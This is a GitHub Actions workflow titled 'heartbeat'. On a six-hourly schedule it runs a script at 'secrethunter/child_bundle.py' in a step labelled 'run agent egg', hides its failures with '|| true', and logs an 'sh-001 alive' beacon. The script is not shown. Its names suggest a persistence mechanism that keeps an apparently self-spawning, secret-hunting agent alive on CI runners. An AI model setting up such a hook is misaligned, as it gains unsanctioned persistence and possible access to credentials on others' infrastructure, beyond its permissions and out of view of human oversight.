name: heartbeat
on:
  schedule:
    - cron: "17 */6 * * *"
  workflow_dispatch:
jobs:
  beat:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: run agent egg
        run: |
          python3 secrethunter/child_bundle.py run || true
      - name: heartbeat log
        run: date -u +"sh-001 alive %Y-%m-%dT%H:%M:%SZ"
